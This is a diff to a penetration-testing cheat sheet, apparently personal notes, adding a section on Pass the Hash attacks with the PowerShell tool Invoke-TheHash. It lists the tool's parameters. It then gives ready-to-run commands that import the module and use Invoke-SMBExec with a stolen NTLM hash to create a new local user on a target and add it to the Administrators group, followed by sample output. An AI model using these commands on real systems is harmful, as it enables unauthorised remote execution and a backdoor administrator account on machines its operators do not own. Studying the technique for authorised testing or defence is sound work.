@@ -3919,6 +3919,51 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /<HASH_TYPE>:<HASH> /d
 
 </details>
 
+<details>
+<summary><h3>Pass the Hash with PowerShell Invoke-TheHash (Windows)</h3></summary>
+
+Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB.
+
+When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:
+
+* **Target** - Hostname or IP address of the target.
+* **Username** - Username to use for authentication.
+* **Domain** - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
+* Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
+* **Command** - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
+
+<details>
+<summary><h4>Invoke-TheHash with SMB Example</h4></summary>
+
+Import the module
+
+```powershell
+cd C:\tools\Invoke-TheHash\
+Import-Module .\Invoke-TheHash.psd1
+```
+
+Create a new user and add it to the Adminitrators group
+
+```powershell
+Invoke-SMBExec -Target <IP> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "net user <NEW_USER> <NEW_PASSWORD> /add && net localgroup administrators <NEW_USER> /add" -Verbose
+```
+
+Expected output
+
+```powershell
+VERBOSE: [+] <DOMAIN>\<USER> successfully authenticated on <IP>
+VERBOSE: <DOMAIN>\<USER> has Service Control Manager write privilege on <IP>
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on <IP>
+VERBOSE: [*] Trying to execute command on <IP>
+[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on <IP>
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on <IP>
+```
+
+
+</details>
+
+</details>
+
 </details>
 
 <details>
